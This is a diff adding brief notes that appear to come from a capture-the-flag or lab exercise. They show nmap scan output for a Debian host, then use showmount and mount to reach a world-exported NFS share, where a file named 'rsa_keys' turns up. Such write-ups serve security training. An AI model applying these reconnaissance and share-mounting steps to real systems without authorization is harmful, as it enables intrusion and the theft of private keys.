@@ -1,0 +1,43 @@
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
+|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
+|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
+|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (EdDSA)
+80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Recovery Page
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      54344/udp  mountd
+|   100005  1,2,3      58244/tcp  mountd
+|   100021  1,3,4      40514/udp  nlockmgr
+|   100021  1,3,4      48158/tcp  nlockmgr
+|   100024  1          44314/udp  status
+|   100024  1          55188/tcp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+2049/tcp open  nfs_acl 2-3 (RPC #100227)
+MAC Address: 02:E1:C3:ED:AF:1F (Unknown)
+
+
+## 4 ports open (most important 111 & 2049 NFS & RPC)
+
+
+$ showmount -e 10.10.81.77
+Export list for 10.10.81.77:
+/var/failsafe *
+
+## /var/failsafe * is what we found. Now we make a directory for the mount
+
+$ mkdir nfsmount
+$ mount 10.10.81.77:/var/failsafe  /root/Desktop/nfsmount/
+
+## We got a file 'rsa_keys'
+
